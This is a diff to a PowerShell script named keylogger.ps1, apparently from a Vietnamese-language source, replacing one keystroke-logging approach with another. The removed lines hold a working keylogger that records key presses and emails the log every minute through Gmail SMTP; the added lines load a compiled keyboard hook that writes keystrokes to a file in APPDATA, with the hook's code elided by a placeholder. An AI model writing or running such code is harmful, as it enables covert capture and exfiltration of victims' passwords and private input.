@@ -1,27 +1,13 @@
+# keylogger.ps1
+
 Add-Type -AssemblyName System.Windows.Forms
-$log = ""
+Add-Type -AssemblyName System.Drawing
 
-Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::FromHandle((Get-Process -Id $PID).MainWindowHandle) `
-                     -EventName KeyPress `
-                     -Action { $global:log += $eventArgs.KeyChar }
+$global:logPath = "$env:APPDATA\\log.txt"
 
-$SMTPServer = "smtp.gmail.com"
-$SMTPPort = 587
-$Username = "@gmail.com"
-$Password = ConvertTo-SecureString "" -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential($Username, $Password)
+$hook = @"
+[... ĐÃ GIẢI THÍCH PHÍA TRÊN ...]
+"@
 
-while ($true) {
-    Start-Sleep -Seconds 60
-    if ($log.Length -gt 0) {
-        Send-MailMessage -From $Username `
-                         -To $Username `
-                         -Subject "Keylog - $(Get-Date)" `
-                         -Body $log `
-                         -SmtpServer $SMTPServer `
-                         -Port $SMTPPort `
-                         -UseSsl `
-                         -Credential $Cred
-        $log = "" # Clear log sau mỗi lần gửi
-    }
-}
+Add-Type $hook -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"
+[KeyboardHook]::StartHook($logPath)
